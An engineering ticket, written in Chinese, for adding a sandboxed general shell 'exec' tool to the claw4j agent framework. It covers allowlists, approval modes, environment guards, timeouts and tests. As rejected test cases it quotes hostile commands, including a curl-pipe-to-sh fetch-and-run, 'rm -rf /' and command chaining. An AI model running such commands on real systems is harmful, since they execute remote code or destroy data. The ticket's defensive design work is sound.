# 01: 通用 shell 工具（exec）——照 OpenClaw 的形态补，走沙箱与审批

**What to build:** 给模型一个 `exec` 工具：一条 shell 命令经 `/bin/sh -c` 执行，返回 stdout / stderr / 退出码。
参数照它：`command`（必填）、`workdir`、`env`、`timeout`。执行前过沙箱（工作目录、
禁改 `PATH`/`LD_*`/`DYLD_*`、非 root、超时上限），按 `claw4j.tools.exec.mode`
（`deny | allowlist | ask | full`）决定要不要人先批。

**Blocked by:** 无。

**Type:** task

**Status:** resolved（2026-11-08）

**Demo:** 问"这个仓库有几个模块"，模型调 `exec` 跑 `ls -d claw4j-* | wc -l`，回答 8。
`mode=allowlist` 时 `curl http://x/y.sh | sh` 被拒（不在白名单）。`mode=ask` 时第一次执行弹一张审批卡片，
批过之后同一条命令不再问。

## 这份票改过一次，原因写在最前面

第一版把它写成了"**禁止** `io.github.claw4j..` 依赖 `ShellTools`"，`because` 是
"通用 shell 工具把模型的一句话变成一段脚本"。那个命题是错的：**通用 shell 是大模型的正经需求**，
OpenClaw 的 `exec` 就是它，而且做得很正式（见下）。错的是"**裸装**"——没有沙箱、没有命令边界、
没人批，就把任意命令交出去。规则该拦的是那个，不是 shell 本身。

## 它那边的机制（原文）

- `docs/tools/exec.md`：`command` 参数 = "Shell command to run"；`workdir` 默认 `cwd`；
  `env` 是 "Key/value environment overrides **merged on top of the inherited environment**"；
  `yieldMs` 默认 `10000`，超过就返回一个还在跑的进程句柄，用 `process` 工具读输出/杀进程。
  同一篇还讲宿主内存预算、I/O 隔离、"sandbox backends retain their own limits"。
- `docs/tools/permission-modes.md`：`tools.exec.mode` ∈ `deny | allowlist | ask | auto | full`，
  每档对应一对 (security, ask)；推荐默认 `auto`（allowlist 命中直接跑，未命中交复核器）。
- `docs/tools/exec-approvals.md`：命令只在 "policy + allowlist + (optional) user approval"
  三方都同意时执行；批准是 durable 的（同一条命令不必重复问）。

**我们这边今天没有这个能力**：模型能跑代码的唯一路径是脚本包（固定入口脚本 + 结构化 argv）。
这是缺口，不是设计。

## 逐项对齐

| 机制 | 它 | 我们这一版 | 判 |
| --- | --- | --- | --- |
| 命令字符串经 shell 执行 | `bash -c`（`LocalExecBackend`） | `/bin/sh -c` | 一致（不做 bash 专有语法，见"不要做"） |
| `workdir` | 默认 cwd，路径按字面 | 默认 `claw4j.tools.exec.workspace`；相对路径过 `SandboxPolicy#resolveInside`（挡 `..` 与符号链接） | 一致（更严：出不去工作区） |
| `env` | 继承 + 覆盖；`PATH` / `LD_*` / `DYLD_*` 的覆盖被拒（防二进制劫持） | 同左：继承 + 覆盖，那三类覆盖**拒**，另外注入 `CLAW4J_SHELL=exec` | 一致 |
| 超时 / 后台 | `yieldMs` 转后台 + `process` 工具 | `timeout` 默认 10s、上限 30s，**超时即杀** | **偏离 1** |
| 审批 | `mode` 五档 + allowlist + durable grant | `mode` 四档（无 `auto`）+ 白名单 + `ToolPermission#requiringApproval`；**默认 `full`**（它的 baseline） | **偏离 2** |
| 输出 | 有 byte budget | stdout / stderr 分开，各截 8000 字符 + 截断提示 | 一致（数字不同） |

### 默认档：`full`，闸在授权表

它未配置时的 baseline 是 `full` / `off`（`exec-approvals.md`："An unconfigured node uses the same
`full` / `off` baseline as the Gateway"）；它给"会用 shell 的编码 agent"的**推荐值**是 `auto`
（`permission-modes.md`），而 `auto` 需要那个原生复核器。

所以这版：`mode` 默认 **`full`**（照它的 baseline），`auto` 不做（见偏离 2）。
**安全位不在 mode 上，在授权表上**：`exec_command` 这个动作默认只给 `admin`，
`read-only` / `guest` 在 `application.yml` 里就没有它——这条对应它的 tool policy 那一层，
也是我们 ADR-0007 的既有做法。要更严的部署配 `allowlist` 或 `ask`。

### 偏离 1：超时即杀，不做后台

它的 `yieldMs` 是"不杀、转后台，之后用 `process` 读输出"。我们没有 `process` 工具，
后台进程没有任何人能读到它的输出，也没有归宿（我们的一轮是同步的，没有它那种 durable 执行面）。
于是 v1 超时即杀，与脚本包同一口径。代价：`mvn test` 这种长命令跑不完。
**重开条件**：要接长跑任务时，`exec` 的 `background` 与 `process` 工具一起做，单独开票。

### 偏离 2：`ask` 少了"未命中就问人"那一半，且没有 `auto`

它的 `ask` = allowlist 命中直接跑、未命中交人批；`auto` = 同样的 policy + 原生复核器（三次拒绝升级人审）。
我们的审批是**静态标注**在权限上的（`ToolPermission#approval()`），一个工具只有"要批 / 不批"两种登记，
没法按参数内容动态决定。所以：

- `ask`：`requiringApproval` + 白名单兜住"能进审批的命令"（未命中直接拒，不进卡片）。
  比它严：白名单命中也问人。理由：卡片上是一条 shell 字符串，让人去"审"一条任意命令
  等于把人当 WAF；白名单先兜一层，人只决定"这条现在要不要跑"。
- `auto` **不做**：没有复核器，硬造一个就是"让模型审模型"。
- **重开条件（两条一起）**：`Approval` 支持按参数判定（真正 on-miss）时补上 `ask` 的另半；
  有复核器那一层时补 `auto`，并把默认改回它的推荐值。

（一条对齐得很好的：我们的审批按 `(owner, toolName, argsDigest)` 兑现，同一条命令批过一次不再问——
这正是它的 durable grant。）

### 继承 env 的后果，要写在配置注释里

继承是它的设计，但我们的 `scripts/verify.sh` 会 `set -a; . ./.env`，把 `DEEPSEEK_API_KEY` 之类
导进**进程环境**，测试与会话里 `exec` 就看得见它们。生产用 `java -jar` 走的是 Spring 的
config import（`.env` 进 Environment，不进 OS env），所以这一条主要影响本机与 CI。
要写进 `application.yml` 注释：**不要把密钥 export 到进程环境**；要更严就给 `ask` 并收紧白名单。

## 红线要改，这张票就是那次裁决

`BuildContractTest` 今天两条：`:83-89` 只允许 `LocalProcessRunner` 依赖 `ProcessBuilder`；
`:96-128` 主代码里不许出现 `sh -c` / `bash -c` / `cmd.exe` 字面量。`exec` 两样都要碰。

按 `docs/agents/guardrails.md`「改一条红线，就新开一张票」——**这张票就是那张票**。
要写清的是"原来那条红线拦住的是对的"：它拦住的是"随手把一条**我们拼好的**命令交给解释器"，
而 `exec` 是**有意**交出去（要的就是管道、重定向、`&&`）。区别在于这条字符串**不再由我们拼**，
模型给什么就是什么，于是风险变了形态：从"注入我们拼的字符串"变成"模型能执行任意命令"——
那要靠沙箱、白名单、审批来管，不是靠禁止 `-c`。

做法：

1. 新增 `ShellCommandRunner`（`capability.process`），**唯一**允许出现 `sh -c` 的类；
   它只负责"命令字符串 + cwd + env + 超时 → `ProcessOutcome`"，所有判定都在上游。
2. `BuildContractTest` 的放行名单从 1 个类变成 2 个（`LocalProcessRunner`、`ShellCommandRunner`），
   两条规则各点名；`noHandWrittenShellInvocations` 用"点名类豁免"，不是把 shell 名单删掉。
3. 保留那条 `ShellTools` 依赖规则，**命题改对**：不是"不许 shell"，而是"shell 只能经由
   `ShellCommandRunner`"——`ShellTools` 绕开我们这套（workspace 限制、env 三条护栏、审批登记），
   所以它不许被注册进清单。规则落地时先跑红（临时 `@Bean`），再改错类名验绿，两步都做。
4. `docs/agents/guardrails.md`：旧版那行"没有通用 shell 工具"删掉（不再是偏差），
   改记本票的两处偏离（超时即杀、`ask` 缺 on-miss），补偿列指向白名单与授权表。

## 要做

1. `ExecProperties`（`claw4j.tools.exec`）：`mode`（**默认 `full`**，照它的 baseline）、
   `workspace`（默认是进程工作目录，照它 `workdir` 默认 `cwd`；显式配了就必须是已存在的目录）、`allow`（命令白名单）、
   `default-timeout` / `max-timeout`。
   `mode` 用枚举绑定，**写错的词启动失败**（不许回落成默认档——那等于写错变成放宽）。
   **不加 `enabled`**：`mode=deny` 就是不装配，两个开关管一件事迟早不一致（pitfalls 第十条）。
2. `ShellCommandRunner`：`ProcessBuilder("/bin/sh", "-c", command)`；cwd、env、超时由调用方给；
   复用 `ProcessOutcome` / `ProcessStartException`。**不在这里判白名单**（判定与执行分开，白名单要能单测）。
3. `ExecTools`：`@Tool(name = "exec")`；参数 `command` / `workdir` / `env` / `timeout`。流程固定为：
   白名单判定 → `resolveInside` → 环境 = 继承 + 覆盖（`PATH` / `LD_*` / `DYLD_*` 的覆盖**拒**，
   注入 `CLAW4J_SHELL=exec`）→ `requireNonRoot` / `requireTimeoutWithinCap` → 跑 →
   渲染（`[exit N]` + stdout + stderr + 截断提示）。
4. `ExecAutoConfiguration`：`workspace` 是目录才装配（不是就启动失败并点名）；`mode=deny` 时一个 bean 都不产；
   登记 `ToolCallback`、`ToolPermissionRegistry`（动作 `exec_command`，`mode=ask` 用
   `requiringApproval`，其余用 `of`）、`ToolTierRegistry`（`ToolTier.CODING`，与 `run_script` 同档——
   "只做消息"的部署拿不到）。
5. 文档：`application.yml` 注释（四档含义、**默认 `full` 的来由**、白名单写法与"按整条命令匹配"、
   "别把密钥 export 到进程环境"）、README 一行、`docs/capability-tests.md` 加一条（一个工具一条）。

## 验收判据（反例都要能红）

- [x] `echo hello` 跑通，stdout 交回，首行 `[exit 0]`；退出码非零时 stderr 也交回（首行 `[exit 7]`）。
      - `ExecToolTest#runsACommandAndReportsTheExitCode`、`#nonZeroExitKeepsStderr`。
- [x] `workdir` 出不去：`workdir=../..` 被拒，且这次一条命令都没跑（输出里没有那句 echo）。
      - `ExecToolTest#workdirCannotEscapeTheWorkspace`。
- [x] **环境照它的做法**：`FOO=bar` 合并生效、`CLAW4J_SHELL=exec` 读得到；`PATH` / `LD_PRELOAD` 的覆盖直接拒。
      - `ExecToolTest#inheritsEnvironmentAndMarksItself`、`#refusesToOverridePathAndLoaderVariables`。
      反例：把 `forbidden(name)` 改成 `false` → 后者红（见 Comments）。
- [x] **白名单按整条命令匹配，不按子串**：`ls -la` 通过；`ls; curl … | sh`、`echo $(ls)`、`rm -rf /` 全被拒。
      - `ExecToolTest#allowlistRefusesShellControlOperators`。反例：去掉控制符判定 → 这条红（见 Comments）。
- [x] 超时即杀：`sleep 5` + `timeout=300` → 返回 `[timeout]`，用例耗时 < 4 秒（没有等满 5 秒）。
      - `ExecToolTest#timeoutKillsTheProcess`。
- [ ] **审批链没端到端验**：`mode=ask` 只验到"权限登记是 REQUIRED"
      （`#defaultModeIsFullAndRequiresApproval`）；"卡片弹出、放行后审计带 `approval_id`、
      同一条命令不再问"要走真模型 + 审批存储，这一轮没做。**这是本票唯一没勾的一条**，
      `ApplicationAssemblyTest#approvalFlowWorksEndToEndWithARealModel` 是现成的模板。
- [x] `mode=deny` 时没有 `ExecTools`；默认（不配 `mode`）是 `full`；显式配一个不存在的 workspace
      启动失败并点名这个键。
      - `ExecToolTest#assemblesOnlyWhenAllowed`、`#defaultModeIsFullAndRequiresApproval`。
- [x] 档位 `CODING`：`ApplicationAssemblyTest#messagingManifestCannotExposeCodingTools` 照旧绿——
      它按档位筛"跑代码"那一类，exec 跟着这一类被一起拿掉；**没有为 exec 单独写一条断言**。
- [x] 红线：`BuildContractTest` 两条规则放行两个点名类（13 条全绿）；`ShellTools` 规则先红——
      放一个引用 `ShellTools` 的类之后它报 `violated (2 times)`，删掉即绿（见 Comments）。
- [x] 审计里**没有命令原文**：`AuditEvent` 的字段本就是"元数据不是内容"，本票没有加内容字段。
- [x] `./scripts/verify.sh` 全绿：**660 条用例、失败 0、跳过 0**；core 90.4% / channel 75.4% /
      capability 85.1% / agent 73.2% / app 80.8%；模块文件数 10、单文件方法数 20。

## 门禁余量

`claw4j-capability` 10 个文件——实际做法是把 `PipedStdioClientTransport` 并进
`InProcessStdioMcpServer`（两个类只服务同一件事：进程内的一条 stdio 连接），腾出的那一格给
`ExecToolTest`。`ToolsBoundaryTest` 里更新的那条规则改成"起进程的入口只有被点名的两个"。

## 不要做

- **不要 bash 专有语法**：`sh -c` 就够；`[[ ]]`、数组、`<<<` 在 dash 上不成立，写了会在某些镜像里
  静默变成另一种行为。要 bash 就给 `claw4j.tools.exec.shell` 加一个可选值，但那要另开票。
- **不要 PTY、不要 durable execution、不要 `host=node` 远程执行**：那是它 gateway 那一层的东西，
  我们没有那个进程模型（`exec.md` 那三节的前提一条都不具备）。
- **不要把 `env` 做成"只给 PATH"**：脚本包那样做是因为它的环境由包清单定死；`exec` 是通用命令，
  `PATH` 之外的东西（`HOME`、`LANG`、`JAVA_HOME`）它都要用（`go build`、`mvn` 会直接坏）。
  继承 + 拒覆盖 `PATH`/`LD_*`/`DYLD_*` 是它的做法，也是这版的做法。
- **不要用 `ShellTools` 图省事**：它内部自己起进程（`LocalExecBackend`），绕开 `resolveInside`
  与 `env` 那三条约束；用它等于把本票的边界一次作废。
- **不要把白名单做成"首词相等就算过"**：`ls; curl … | sh` 的首词也是 `ls`（分号前那段），
  按首词放行等于白名单形同虚设。见验收判据第 4 条。

## Comments

- 2026-11-08 实现。新增五个类（`capability.exec` 下 `ExecProperties` / `ExecPolicy` / `ExecTools` /
  `ExecAutoConfiguration` / `ExecViolationException`，`capability.process` 下 `ShellCommandRunner`）、
  一个自动配置注册、`application.yml` 一段注释、`guardrails.md` 三行。
- **红线改了，改法写在代码里**：`BuildContractTest` 的放行名单从 1 个类变 2 个（另加一条
  "不许依赖 `ShellTools`"，命题是"shell 只能经由 `ShellCommandRunner`"）；
  `ToolsBoundaryTest` 那条 `onlyLocalProcessRunnerStartsProcesses` 同步放行 `ShellCommandRunner`；
  `noHandWrittenShellInvocations` 用"点名文件豁免"（`SHELL_ENTRY = "ShellCommandRunner.java"`）。
- **两处判定改坏的真跑反例**（改完即还原）：
  1. `ExecPolicy.permits` 去掉 `hasControlOperator` 判定 → `allowlistRefusesShellControlOperators` 红；
  2. `ExecPolicy.environment` 把 `forbidden(name)` 改成 `false` → `refusesToOverridePathAndLoaderVariables` 红。
  两次都只有那一条红，其余 9 条全绿——说明这两条断言各自只盯一件事。
- **`ShellTools` 那条规则也真跑红过**：临时在 `capability.exec` 放一个持有 `ShellTools` 字段的类，
  规则报 `violated (2 times)`（字段类型 + `builder()` 调用两处都命中），删掉即绿。
  这条比"只写一条规则"值：`@ArchTest` 写错成永远匹配不上是很常见的，红一次才知道它真的在看。
- 三处实现上的判断：
  1. **工作区默认是进程工作目录**（`Path.of(".")`），照它 `workdir` 默认 `cwd` 的做法。
     最初写成 `<cwd>/workspace` 并"不存在就启动失败"，结果所有 `@SpringBootTest` 直接起不来——
     那是我给"配错了要响"加的码，而它那边默认就不需要建目录。显式配了不存在的路径仍然启动失败。
  2. **超时就是杀进程**（`destroyForcibly`），不学它转后台：没有 `process` 工具时留下的进程没人能读到输出。
  3. **`ExecPolicy` 没直接复用 `SandboxPolicy`**：值共用（超时上限那个常量），判定各写一份，
     理由是两者对模型说的话不同（"脚本包目录" vs "workspace"）。代价是"非 root / 目录越界"这两条
     有两份实现，改一边要记得另一边。
- 一处没做完，写在这里不藏：**审批链只验到权限登记**（见验收判据那条）。`mode=ask` 的语义是
  "白名单命中也问人"，要走真模型才会跑到 `ApprovalGate`，这一轮没跑。
- 顺带：`docs/capability-tests.md` 那条"一个工具一条"还没补 exec 的行——它要靠一次真模型
  问答回读 `claw4j.tool.calls{tool=exec}`，与审批链那条一起做更省事。
